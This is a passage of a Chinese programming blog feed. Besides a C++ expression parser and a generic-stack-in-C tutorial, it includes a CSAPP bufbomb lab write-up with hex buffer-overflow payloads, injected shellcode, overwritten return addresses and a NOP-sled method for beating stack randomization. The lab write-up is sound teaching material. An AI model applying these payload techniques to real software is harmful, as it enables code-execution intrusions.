class="line">        BinaryOperator Operator;</div><div class="line">        <span class="keyword">if</span> (Is(Read, <span class="string">"+"</span>))</div><div class="line">        &#123;</div><div class="line">            Operator = BinaryOperator::Plus;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (Is(Read, <span class="string">"-"</span>))</div><div class="line">        &#123;</div><div class="line">            Operator = BinaryOperator::Minus;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        Result = <span class="built_in">std</span>::make_shared&lt;BinaryExpression&gt;(Operator, Result, GetFactor(Read));</div><div class="line">    &#125;</div><div class="line">    Stream = Read;</div><div class="line">    <span class="keyword">return</span> Result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完成：<code>Exp = Factor (( &#39;+&#39; | &#39;-&#39; ) Factor)*</code><br>构造出来的形状是这样的：<br><img src="/images/prepost/2.jpg" alt="1"></p>
<h4 id="GetFactor"><a href="#GetFactor" class="headerlink" title="GetFactor"></a>GetFactor</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; GetFactor(<span class="keyword">const</span> <span class="keyword">char</span> *&amp;Stream)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *Read = Stream;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; Result = GetTerm(Read);</div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</div><div class="line">    &#123;</div><div class="line">        BinaryOperator Operator;</div><div class="line">        <span class="keyword">if</span> (Is(Read, <span class="string">"*"</span>))</div><div class="line">        &#123;</div><div class="line">            Operator = BinaryOperator::Multiply;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (Is(Read, <span class="string">"/"</span>))</div><div class="line">        &#123;</div><div class="line">            Operator = BinaryOperator::Divide;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        Result = <span class="built_in">std</span>::make_shared&lt;BinaryExpression&gt;(Operator, Result, GetTerm(Read));</div><div class="line">    &#125;</div><div class="line">    Stream = Read;</div><div class="line">    <span class="keyword">return</span> Result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完成：<code>Factor = Term (( &#39;*&#39; | &#39;/&#39; ) Term)*</code></p>
<h4 id="GetTerm"><a href="#GetTerm" class="headerlink" title="GetTerm"></a>GetTerm</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Expression&gt; GetTerm(<span class="keyword">const</span> <span class="keyword">char</span> *&amp;Stream)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">try</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> GetNumber(Stream);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (Exception &amp;e)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *Read = Stream;</div><div class="line">        <span class="keyword">if</span> (Is(Read, <span class="string">"("</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">auto</span> Result = GetExp(Read);</div><div class="line">            <span class="keyword">if</span> (Is(Read, <span class="string">")"</span>))</div><div class="line">            &#123;</div><div class="line">                Stream = Read;</div><div class="line">                <span class="keyword">return</span> Result;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                <span class="keyword">throw</span> Exception(Stream, <span class="string">"此处需要右括号"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">throw</span> e;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完成：<code>Term = &lt;数字&gt; | &#39;(&#39; Exp &#39;)&#39;</code></p>
<p>好了，这样就搞定啦！虽然代码看起来有点点长，可是思路是十分清晰自然的。我相信用函数式语言来写会短几十倍的，用C++写只是为了照顾大部分人。最后奉上测试代码。</p>
<hr>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">auto</span> a = <span class="string">"75 + 66 * (555-333*444) - 332 * 111"</span>;</div><div class="line">    <span class="keyword">try</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">auto</span> <span class="built_in">exp</span> = GetExp(a);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (Exception &amp;e)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; e.Start &lt;&lt; e.Error &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//Do what you want to do</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<p>完整代码：<a href="https://gist.github.com/zhongzc/3f9cc3024684ab5b0b70729a348c5f6a" target="_blank" rel="external">https://gist.github.com/zhongzc/3f9cc3024684ab5b0b70729a348c5f6a</a></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;纠结星人的胜利。&lt;/p&gt;
    
    </summary>
    
      <category term="原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="编译原理" scheme="http://gaufoo.com/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
      <category term="C++11" scheme="http://gaufoo.com/tags/C-11/"/>
    
  </entry>
  
  <entry>
    <title>利用C语言缺陷进行缓冲区溢出攻击</title>
    <link href="http://gaufoo.com/2017/12/30/overflow/"/>
    <id>http://gaufoo.com/2017/12/30/overflow/</id>
    <published>2017-12-30T06:22:22.000Z</published>
    <updated>2017-12-30T06:54:04.833Z</updated>
    
    <content type="html"><![CDATA[<p>黑客初体验。</p>
<a id="more"></a>
<hr>
<h1 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h1><h2 id="简单栈帧结构"><a href="#简单栈帧结构" class="headerlink" title="简单栈帧结构"></a>简单栈帧结构</h2><p>对栈帧结构最简单的解释就是，用<strong>栈指针(sp, stack pointer)</strong> 和<strong>帧指针(bp, base pointer)</strong> 标识内存头尾，中间部分的内存供函数的代码进行操作。<br><img src="/images/overflow/mmexport1514564834036.jpg" width="400px"></p>
<h2 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h2><p>包括代码域和数据域：</p>
<ul>
<li>代码域存放代码，但是是固定的，运行之前就已经确定。</li>
<li>数据域存放临时变量，运行时才开辟出来，采用的是<strong>栈帧结构</strong>。</li>
</ul>
<p>当代码段执行<code>call &lt;func&gt;</code>，程序将跳转到<code>func</code>函数的代码头，执行<code>func</code>函数的代码，并让它自行开辟栈帧。<br><img src="/images/overflow/mmexport1514564847370.jpg" width="400px"></p>
<h2 id="假想栈帧结构"><a href="#假想栈帧结构" class="headerlink" title="假想栈帧结构"></a>假想栈帧结构</h2><p>当<code>func</code>函数执行完，应该回到调用它的原来的函数代码，以及回到原来函数的栈帧。那么该如何实现呢？</p>
<ul>
<li><p>回到原来的栈帧：其中一种假想的思路是，栈指针和帧指针指向的内存分别存放原来的栈指针和帧指针，返回的时候直接替换就行了。<br><img src="/images/overflow/mmexport1514564838433.jpg" width="400px"></p>
</li>
<li><p>回到原来的代码：可以在帧指针的上一处内存存放<code>call &lt;func&gt;</code>的下一句代码的地址，这样返回的时候让帧指针帮下忙，就可以轻松回到原来的代码。<br><img src="/images/overflow/mmexport1514564820384.jpg"></p>
</li>
</ul>
<h2 id="实际结构"><a href="#实际结构" class="headerlink" title="实际结构"></a>实际结构</h2><p>这样假想的栈帧结构其实已经很像真实的栈帧结构了。<br>为了所谓的追求速度，真正的函数栈帧结构其实是连续的，一串连着一串，像这样：<br><img src="/images/overflow/mmexport1514564829598.jpg" width="500px"><br>与假想的栈帧结构相比：</p>
<ul>
<li>不变的是返回地址还是在帧指针之上，帧指针还是指向原来的帧指针。</li>
<li>不同的是栈指针不再需要存放原来的栈指针，因为返回地址之上就是原来栈指针所指的地方。</li>
</ul>
<h2 id="过程汇编代码"><a href="#过程汇编代码" class="headerlink" title="过程汇编代码"></a>过程汇编代码</h2><p>调用函数的经过如下：</p>
<ol>
<li><code>push pc</code> # 返回地址入栈。</li>
<li><code>push bp</code> # 原来的帧指针入栈。</li>
<li><code>mov sp,bp</code> # 让帧指针指向原来的帧指针。</li>
<li><code>sub sp,#(栈帧大小)</code> # 让栈指针往下开辟一个新的栈帧。</li>
</ol>
<p><img src="/images/overflow/mmexport1514564825156.jpg" alt="mmexport1514564825156"></p>
<p>类似的，返回原来函数的经过如下：</p>
<ol>
<li><code>mov bp,sp</code> # 栈指针指向帧指针指向的内存。</li>
<li><code>pop bp</code> # 帧指针指向原来帧指针指向的内存。</li>
<li><code>pop pc</code> # 回到原来函数的代码</li>
</ol>
<p><img src="/images/overflow/mmexport1514564842593.jpg" alt="mmexport1514564842593"></p>
<hr>
<h1 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a>缓冲区溢出攻击</h1><p>可以想象，如果有办法修改栈帧上的返回地址，无疑可以让程序转向任何我们想转向的地方。但是一般不具备这样的机会，因为变量都是有固定大小的，很难突破变量大小的限制，修改变量以外的内存。<br>偏偏C语言对速度的变态追求和对程序员的信任，给了我们这样的机会：它几乎从不进行边界检查，数组可以越界，<code>gets</code>可以越界，而且越界以后只要不影响程序的运行，连崩溃都不会发生。<br>假如一个函数调用了<code>gets</code>向局部变量写入字符串，我们就可以写入比局部变量所规定大小还要大的字符串，业内称作<strong>注入字符串</strong>，来覆盖掉栈帧上的信息，从而达到修改内存的目的。</p>
<hr>
<h2 id="破坏型注入"><a href="#破坏型注入" class="headerlink" title="破坏型注入"></a>破坏型注入</h2><p>只粗暴地覆盖返回地址。当函数返回时，代码会跳到被覆盖的返回地址，但是栈帧已经乱套了。<br>不过只要跳到的代码不会用到栈帧，而且能很快就结束程序，那么这种溢出攻击无疑是最简单直接的选择。</p>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>《CSAPP》上提供的实验，需要我们将程序跳到一个名叫<code>smoke</code>的函数。</p>
<p>步骤如下：</p>
<ol>
<li>反汇编程序得到汇编代码。</li>
<li>查看调用<code>gets</code>的函数的汇编代码，推测需要覆盖多少字节。</li>
<li>查看<code>smoke</code>函数的代码地址。</li>
<li>编写注入的16进制机器码。</li>
<li>实行覆盖。</li>
</ol>
<hr>
<ul>
<li>反汇编：  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> objdump -d ./bufbomb &gt; disas.txt</span></div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>查看调用<code>gets</code>的函数：<br>  <img src="/images/overflow/0.png"><br>  将<code>%ebp-0x28</code>赋给<code>%eax</code>令人瞩目，这就是字符串首地址。因此覆盖的字符串应当包含：4位返回地址 + 4位bp + 40(0x28的十进制)位字符。</p>
</li>
<li><p><code>smoke</code>函数首地址：<br>  <img src="/images/overflow/1.png"><br>  得到<code>smoke</code>函数首地址：<code>0x08048c18</code></p>
</li>
<li><p>编写注入的16进制机器码</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00 /* 原字符串大小 */</div><div class="line">00 00 00 00 /* 现bp所指位置，原bp所在位置 */</div><div class="line">18 8c 04 08 /* 覆盖的返回地址 */</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>转成ASCII字符串，此处省略</p>
</li>
<li><p>注入，查看结果<br>  <img src="/images/overflow/3.png"><br>  成功</p>
</li>
</ul>
<hr>
<h2 id="擦屁股型注入"><a href="#擦屁股型注入" class="headerlink" title="擦屁股型注入"></a>擦屁股型注入</h2><p>与破坏型注入相对的是：擦屁股型注入。大意是能让程序正确地返回到原来的函数，并且恢复原来的栈帧。这种注入的要求更高，但是能做到的东西更多，更神不知鬼不觉。<br>这里要讲到汇编语言的一个缺陷：可以允许pc跳到栈段，并把里面的数据当代码执行。因此，只要把注入代码伪装成字符串，让覆盖的返回地址指向注入代码头，就可以让程序执行注入代码。再配合上擦屁股，就可以让作案现场毫无破绽。<br>这就是我花这么大的篇幅去讲解栈帧结构的原因：只要真正理解了栈帧结构，恢复它简直易如反掌。</p>
<p>要点如下：</p>
<ol>
<li>覆盖返回地址时，会覆盖bp所指向的原bp，只要保证它不变，bp就能顺利回到原bp。</li>
<li>跳到注入代码后，sp已经指向原sp了，所以只要在注入代码的最后，把原返回地址push进栈再ret，就和原来的代码如出一辙。</li>
</ol>
<h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><p>《CSAPP》上提供的实验，需要我们修改向原函数返回的值。<br>要修改返回值，就要修改寄存器，可寄存器不如内存那么好处理，不能直接覆盖，只能通过注入代码的方式修改。而且要想成功返回，就得做好擦屁股的工作。</p>
<p>步骤如下：</p>
<ol>
<li>查看反汇编代码，记录正确的返回地址。</li>
<li>用<code>gdb</code>调试程序，记录原bp和字符串首地址。</li>
<li>编写注入的汇编代码，并利用<code>gcc</code>，<code>objdump</code>工具将其翻译成机器码。</li>
<li>编写注入的16进制机器码。</li>
<li>实行覆盖。</li>
</ol>
<hr>
<ul>
<li><p>查看反汇编代码：<br>  <img src="/images/overflow/2.png"><br>  得到返回地址：<code>0x08048dbe</code></p>
</li>
<li><p>用<code>gdb</code>查看原bp：</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> gdb ./bufbomb</span></div><div class="line">  </div><div class="line">(gdb) b getbuf</div><div class="line">(gdb) run -u gaufoo</div><div class="line">(gdb) p /x *(int *)$ebp</div></pre></td></tr></table></figure>
<p>  <img src="/images/overflow/5.png"></p>
<p>  得到原bp：<code>0x55683d20</code></p>
</li>
<li><p>用<code>gdb</code>查看字符串首地址，就把代码注入到那：</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> gdb ./bufbomb</span></div><div class="line">  </div><div class="line">(gdb) b getbuf</div><div class="line">(gdb) run -u gaufoo</div><div class="line">(gdb) p /x ($ebp-0x28)</div></pre></td></tr></table></figure>
<p>  <img src="/images/overflow/7.png"></p>
<p>  得到字符串首地址：<code>0x55683cc8</code></p>
</li>
<li><p>编写汇编代码，并译成机器码：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// sc.s</div><div class="line">mov $0x4a3e65c1,%eax</div><div class="line">push $0x08048dbe</div><div class="line">ret</div></pre></td></tr></table></figure>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> gcc -m32 -c sc.s</span></div><div class="line"><span class="meta">$</span><span class="bash"> objdump -d sc.o</span></div></pre></td></tr></table></figure>
<p>  <img src="/images/overflow/6.png"></p>
</li>
<li><p>编写注入的16进制机器码：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">b8 c1 65 3e 4a  /* mov $0x4a3e65c1,%eax */</div><div class="line">68 be 8d 04 08  /* push $0x08048dbe */</div><div class="line">c3              /* ret */</div><div class="line">00 00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00 </div><div class="line">20 3d 68 55     /* 现bp所指位置，原bp所在位置 */</div><div class="line">c8 3c 68 55     /* 字符串首地址 */</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>转成ASCII字符串，此处省略</p>
</li>
<li><p>注入，查看结果<br>  <img src="/images/overflow/8.png"><br>  成功</p>
</li>
</ul>
<hr>
<h2 id="反注入原理与抗反注入方法"><a href="#反注入原理与抗反注入方法" class="headerlink" title="反注入原理与抗反注入方法"></a>反注入原理与抗反注入方法</h2><p>gcc编译器反注入的其中一种措施是<strong>栈随机化</strong>，原理是：每次程序运行时在栈最底部随机插上一段不用的内存，让实际使用的栈地址发生变化。它会导致原bp所在位置和字符串首地址不再是固定值，给代码注入带来一定困难。</p>
<p>对抗这种反注入的方法也挺简单的：</p>
<ul>
<li>原bp可以通过现sp计算得到。</li>
<li>虽然不再能得到字符串首地址，但可以大概猜到字符串中间的位置，只要把代码放在最后面，前面全部用空语句填充。当代码转到任何一个空语句，最终都能“滑”到我想执行的注入代码。</li>
</ul>
<h3 id="实践-2"><a href="#实践-2" class="headerlink" title="实践"></a>实践</h3><p>《CSAPP》上提供的实验，注入5次字符串，每次都需要修改向原函数返回的值，难点在于每次注入时的栈地址都会发生变化，模拟编译器的栈随机化。</p>
<p>步骤如下：</p>
<ol>
<li>查看反汇编代码，记录正确的返回地址。</li>
<li>查看反汇编代码，记录原bp和原sp的距离。</li>
<li>用<code>gdb</code>调试程序，查看5次字符串首地址，记录最接近尾部的值，即最大值，作为猜测出来的栈中间地址。</li>
<li>编写注入的汇编代码，并利用<code>gcc</code>，<code>objdump</code>工具将其翻译成机器码。</li>
<li>编写注入的16进制机器码。</li>
<li>实行覆盖。</li>
</ol>
<hr>
<ul>
<li><p>记录正确的返回地址：<br>  <img src="/images/overflow/9.png"><br>  得到返回地址：<code>0x08048e3a</code></p>
</li>
<li><p>记录原bp和原sp的距离<br>  <img src="/images/overflow/9.png"></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">push %ebp</div><div class="line">push %ebx</div><div class="line">sub $0x24,%esp</div></pre></td></tr></table></figure>
<p>  由这三句汇编代码可得距离为：0x28 = 0x24 + 0x4(ebx长度)</p>
</li>
<li><p>查看5次字符串首地址</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ gdb ./bufbomb</div><div class="line">  </div><div class="line">(gdb) b getbufn</div><div class="line">(gdb) run -n -u gaufoo</div></pre></td></tr></table></figure>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) disas getbufn</div></pre></td></tr></table></figure>
<p>  <img src="/images/overflow/10.png"></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div></pre></td></tr></table></figure>
<p>  <img src="/images/overflow/11.png"></p>
<p>  得到首地址最大值：<code>0x55683b58</code></p>
</li>
<li><p>编写注入汇编代码：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x4a3e65c1,%eax</div><div class="line">lea -0x28(%esp),%ebp</div><div class="line">push $0x08048e3a</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>  <code>gcc</code>+<code>objdump</code>，翻译成机器码：<br>  <img src="/images/overflow/12.png"></p>
</li>
<li><p>编写注入机器码：<br>  首先0x208是字符串缓冲区长度，十进制为520。<br>  因此注入的机器码应为：509个字节空指令 + 15个字节注入代码 + 4个字节跳转地址 = 528个字节，<br>  因为要注入5次，所以后面要加上’\0a’，再复制5次。<br>  <img src="/images/overflow/13.png"></p>
</li>
<li><p>转成ASCII字符串，此处省略</p>
</li>
<li><p>注入，查看结果<br>  <img src="/images/overflow/14.png"><br>  成功</p>
</li>
</ul>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;黑客初体验。&lt;/p&gt;
    
    </summary>
    
      <category term="汇编" scheme="http://gaufoo.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="C" scheme="http://gaufoo.com/tags/C/"/>
    
      <category term="原理" scheme="http://gaufoo.com/tags/%E5%8E%9F%E7%90%86/"/>
    
      <category term="汇编" scheme="http://gaufoo.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>听说C语言也可以“泛型”</title>
    <link href="http://gaufoo.com/2017/12/09/genericC/"/>
    <id>http://gaufoo.com/2017/12/09/genericC/</id>
    <published>2017-12-09T07:02:51.000Z</published>
    <updated>2017-12-09T10:09:04.462Z</updated>
    
    <content type="html"><![CDATA[<p>都说泛型是C++的一大特性，我大C语言表示不服</p>
<a id="more"></a>
<hr>
<h1 id="再探类型"><a href="#再探类型" class="headerlink" title="再探类型"></a>再探类型</h1><p>C/C++类型由以下各项组成：</p>
<ul>
<li>内存里的’0’、’1’序列</li>
<li>‘0’、’1’串占用的内存大小</li>
<li>作为操作数时如何解释与输出位模式（如cout、printf、强制类型转换）</li>
<li>作为操作数时如何修改位模式（如+、-、*、/）</li>
</ul>
<h1 id="“泛型”原理"><a href="#“泛型”原理" class="headerlink" title="“泛型”原理"></a>“泛型”原理</h1><p>只需要提供内存首地址，类型大小。利用上面提出的前两点，直接操作内存，就能正确实现泛型。而且不需要为每个类型重新生成代码，克服了C++的代码膨胀问题。</p>
<h1 id="热身——swap泛型实现"><a href="#热身——swap泛型实现" class="headerlink" title="热身——swap泛型实现"></a>热身——swap泛型实现</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">void</span> *vp1, <span class="keyword">void</span> *vp2, <span class="keyword">int</span> size)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">char</span> buffer[size];</div><div class="line">    <span class="built_in">memcpy</span>(buffer, vp1, size);</div><div class="line">    <span class="built_in">memcpy</span>(vp1, vp2, size);</div><div class="line">    <span class="built_in">memcpy</span>(vp2, buffer, size);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>测试代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">double</span> a = <span class="number">2.5</span>;</div><div class="line">    <span class="keyword">double</span> b = <span class="number">4.5</span>;</div><div class="line">    <span class="keyword">int</span> c = <span class="number">100</span>;</div><div class="line">    <span class="keyword">int</span> d = <span class="number">200</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"a = %f, b = %f\nc = %d, d = %d\n"</span>, a, b, c, d);</div><div class="line">    swap(&amp;a, &amp;b, <span class="keyword">sizeof</span>(<span class="keyword">double</span>));</div><div class="line">    swap(&amp;c, &amp;d, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"a = %f, b = %f\nc = %d, d = %d\n"</span>, a, b, c, d);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>终端输出<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a = 2.500000, b = 4.500000</div><div class="line">c = 100, d = 200</div><div class="line">a = 4.500000, b = 2.500000</div><div class="line">c = 200, d = 100</div></pre></td></tr></table></figure></p>
<hr>
<h1 id="进阶——泛型Stack"><a href="#进阶——泛型Stack" class="headerlink" title="进阶——泛型Stack"></a>进阶——泛型Stack</h1><h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// stack.h</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    <span class="keyword">void</span> *elems;</div><div class="line">    <span class="keyword">int</span> elemSize;</div><div class="line">    <span class="keyword">int</span> logicalLength;</div><div class="line">    <span class="keyword">int</span> allocLength;</div><div class="line">    <span class="keyword">void</span> (*freefn)(<span class="keyword">void</span> *);	<span class="comment">// 用于释放元素时，元素不需要释放则是NULL</span></div><div class="line">&#125; <span class="built_in">stack</span>;</div><div class="line"></div><div class="line">void StackNew(stack *s, int elemSize, void (*freefn)(void *)); // 构造函数</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackDispose</span><span class="params">(<span class="built_in">stack</span> *s)</span></span>;                                   <span class="comment">// 析构函数</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackPush</span><span class="params">(<span class="built_in">stack</span> *s, <span class="keyword">void</span> *elemAddr)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackPop</span><span class="params">(<span class="built_in">stack</span> *s, <span class="keyword">void</span> *elemAddr)</span></span>;</div></pre></td></tr></table></figure>
